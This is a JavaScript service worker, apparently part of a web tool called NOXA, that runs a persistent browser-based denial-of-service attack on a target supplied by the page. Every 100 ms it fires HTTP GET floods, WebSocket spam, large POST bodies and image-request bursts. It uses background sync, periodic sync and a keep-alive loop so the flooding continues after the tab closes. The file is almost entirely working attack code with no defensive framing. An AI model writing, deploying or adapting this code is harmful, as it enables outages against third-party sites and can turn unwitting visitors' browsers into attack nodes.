// sw.js - NOXA Persistent Attack Service Worker
const CACHE_NAME = 'noxa-attack-v2';
const ATTACK_INTERVAL = 100; // ms
let attackTarget = null;
let attackInterval = null;

// Install Service Worker
self.addEventListener('install', (event) => {
    console.log('[SW] NOXA Service Worker installing...');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => {
                return cache.addAll([
                    '/',
                    '/index.html',
                    '/assets/',
                    '/?attack=true'
                ]);
            })
            .then(() => self.skipWaiting())
    );
});

// Activate Service Worker
self.addEventListener('activate', (event) => {
    console.log('[SW] NOXA Service Worker activated!');
    event.waitUntil(
        caches.keys().then(cacheNames => {
            return Promise.all(
                cacheNames.map(cache => {
                    if (cache !== CACHE_NAME) {
                        console.log('[SW] Deleting old cache:', cache);
                        return caches.delete(cache);
                    }
                })
            );
        }).then(() => self.clients.claim())
    );
});

// Handle messages from main thread
self.addEventListener('message', (event) => {
    console.log('[SW] Message received:', event.data);
    
    if (event.data.type === 'START_ATTACK') {
        attackTarget = event.data.target;
        startPersistentAttack(attackTarget);
    }
    
    if (event.data.type === 'STOP_ATTACK') {
        stopPersistentAttack();
    }
    
    if (event.data.type === 'UPDATE_TARGET') {
        attackTarget = event.data.target;
    }
});

// Background Attack Functions
function startPersistentAttack(target) {
    console.log(`[SW] Starting persistent attack on: ${target}`);
    
    if (attackInterval) {
        clearInterval(attackInterval);
    }
    
    // Multi-vector background attack
    attackInterval = setInterval(() => {
        // 1. HTTP Flood
        fetch(`http://${target}`, {
            mode: 'no-cors',
            credentials: 'omit',
            cache: 'no-store'
        }).catch(() => {});
        
        // 2. WebSocket attempts
        try {
            const ws = new WebSocket(`ws://${target}`);
            ws.onopen = () => {
                ws.send('GET / HTTP/1.1\r\n'.repeat(50));
                setTimeout(() => ws.close(), 1000);
            };
        } catch (e) {}
        
        // 3. POST data flood
        fetch(`http://${target}`, {
            method: 'POST',
            mode: 'no-cors',
            body: 'x'.repeat(10000),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }).catch(() => {});
        
        // 4. Image request flood
        for (let i = 0; i < 3; i++) {
            fetch(`http://${target}/attack-${Date.now()}.jpg`, {
                mode: 'no-cors'
            }).catch(() => {});
        }
        
        // Notify all clients
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'ATTACK_STATS',
                    timestamp: Date.now(),
                    target: target
                });
            });
        });
        
    }, ATTACK_INTERVAL);
    
    // Also start background sync if available
    if ('sync' in self.registration) {
        self.registration.sync.register('attack-sync')
            .then(() => console.log('[SW] Background sync registered'))
            .catch(console.error);
    }
}

function stopPersistentAttack() {
    console.log('[SW] Stopping persistent attack');
    if (attackInterval) {
        clearInterval(attackInterval);
        attackInterval = null;
    }
    attackTarget = null;
}

// Background Sync Handler
self.addEventListener('sync', (event) => {
    if (event.tag === 'attack-sync' && attackTarget) {
        event.waitUntil(
            fetch(`http://${attackTarget}`, { mode: 'no-cors' })
                .catch(() => {})
        );
    }
});

// Periodic Sync (every few minutes)
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'attack-periodic' && attackTarget) {
        event.waitUntil(executeBackgroundAttack());
    }
});

// Push Notifications for attack status
self.addEventListener('push', (event) => {
    const data = event.data ? event.data.json() : {};
    const title = data.title || 'NOXA Attack';
    const options = {
        body: data.body || 'Attack is running in background',
        icon: '/assets/icon-192.png',
        badge: '/assets/icon-192.png',
        vibrate: [200, 100, 200],
        data: {
            url: '/?attack=true'
        }
    };
    
    event.waitUntil(
        self.registration.showNotification(title, options)
    );
});

self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    event.waitUntil(
        clients.openWindow('/?attack=true')
    );
});

// Cache-first strategy for offline support
self.addEventListener('fetch', (event) => {
    // Don't cache attack requests
    if (event.request.url.includes('attack=true')) {
        return;
    }
    
    event.respondWith(
        caches.match(event.request)
            .then(response => {
                if (response) {
                    return response;
                }
                return fetch(event.request)
                    .then(response => {
                        if (!response || response.status !== 200 || response.type !== 'basic') {
                            return response;
                        }
                        const responseToCache = response.clone();
                        caches.open(CACHE_NAME)
                            .then(cache => {
                                cache.put(event.request, responseToCache);
                            });
                        return response;
                    });
            }).catch(() => {
                // Return offline page
                return caches.match('/index.html');
            })
    );
});

// Keep alive function
function keepAlive() {
    setInterval(() => {
        self.clients.matchAll().then(clients => {
            if (clients.length === 0 && attackTarget) {
                // No clients but attack should continue
                console.log('[SW] No clients, but attack continues');
            }
        });
    }, 30000);
}

// Start keep alive
keepAlive();

// Execute background attack
async function executeBackgroundAttack() {
    if (!attackTarget) return;
    
    try {
        // Multiple request types
        const promises = [
            fetch(`http://${attackTarget}`, { mode: 'no-cors' }),
            fetch(`http://${attackTarget}/api`, { mode: 'no-cors' }),
            fetch(`http://${attackTarget}/wp-admin`, { mode: 'no-cors' }),
            fetch(`http://${attackTarget}/admin`, { mode: 'no-cors' })
        ];
        
        await Promise.allSettled(promises);
        
        // Send stats to any open clients
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'BACKGROUND_ATTACK_COMPLETE',
                    timestamp: Date.now()
                });
            });
        });
    } catch (error) {
        console.log('[SW] Background attack error:', error);
    }
}

console.log('[SW] NOXA Attack Service Worker loaded successfully');